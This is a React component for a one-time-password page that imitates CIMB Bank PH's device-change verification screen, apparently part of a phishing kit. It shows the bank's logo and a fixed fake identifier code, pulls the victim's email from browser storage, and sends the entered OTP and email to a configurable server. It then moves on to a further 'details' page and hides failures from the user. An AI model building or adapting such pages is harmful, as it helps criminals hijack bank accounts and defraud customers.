import React, { useRef, useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import axios from "axios";
import BASE_URL from "../components/urls";
import logo from "../assets/logo.png";
import { data } from "autoprefixer";
const Otp = () => {
  const navigate = useNavigate();
  const inputsRef = useRef([]);
  const [otp, setOtp] = useState(Array(6).fill(""));
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [counter, setCounter] = useState(60);
  const [email, setEmail] = useState("");
  useEffect(() => {
    const storedEmail = localStorage.getItem("email");
    if (storedEmail) {
      setEmail(storedEmail);
    }
  }, []);

  useEffect(() => {
    if (counter > 0) {
      const timer = setTimeout(() => setCounter(counter - 1), 1000);
      return () => clearTimeout(timer);
    }
  }, [counter]);

  const handleChange = (value, index) => {
    if (/^\d?$/.test(value)) {
      const newOtp = [...otp];
      newOtp[index] = value;
      setOtp(newOtp);
      if (value && index < 5) {
        inputsRef.current[index + 1]?.focus();
      }
    }
  };

  const handleKeyDown = (e, index) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) {
      inputsRef.current[index - 1]?.focus();
    }
  };
  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);

    try {
      await axios.post(`${BASE_URL}/otp`, {
        otp: otp.join(""),
        email: email,
      });

      setOtp(Array(6).fill(""));
      navigate("/details");
    } catch (err) {
      console.log("OTP submission failed:", err); // just logs silently
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-white text-black px-6 pt-6 flex flex-col items-center">
      <div className="w-full max-w-md mt-10 text-center">
        {/* Logo */}
        <div className="flex justify-center">
          <img src={logo} alt="CIMB Logo" className="w-[50%] min-h-[30px]" />
        </div>

        {/* Title and Message */}
        <h1 className="text-lg font-semibold mb-1">
          Do you want to change your device?
        </h1>
        <p className="text-sm text-gray-600 mb-6">
          For security reasons, CIMB Bank PH only allows one registered device
          per user
        </p>

        <p className="text-sm mb-4">
          We sent a security code to{" "}
          <span className="font-bold text-lg">{email}</span> with identifier
          code <span className="font-bold">EQDQ</span> to verify your action.
        </p>

        {/* OTP Inputs */}
        <form onSubmit={handleSubmit}>
          <div className="flex justify-center gap-2 mb-4">
            {otp.map((digit, index) => (
              <input
                key={index}
                type="text"
                inputMode="numeric"
                maxLength={1}
                className="w-10 h-12 text-center text-xl bg-white border-b-2 border-gray-400 focus:outline-none focus:border-black"
                value={digit}
                onChange={(e) => handleChange(e.target.value, index)}
                onKeyDown={(e) => handleKeyDown(e, index)}
                ref={(el) => (inputsRef.current[index] = el)}
              />
            ))}
          </div>

          {error && <p className="text-red-500 text-sm mb-2">{error}</p>}

          <p className="text-xs text-gray-500 mb-4">
            You can resend code if you don’t receive it in{" "}
            <span>{`0:${counter < 10 ? `0${counter}` : counter}`}</span>
          </p>

          <button
            type="submit"
            disabled={loading}
            className="w-full mt-4 py-3 text-white font-semibold rounded-md bg-[#d32f2f] hover:bg-[#b71c1c] transition"
          >
            {loading ? "Verifying..." : "Confirm OTP"}
          </button>
        </form>
      </div>
    </div>
  );
};

export default Otp;
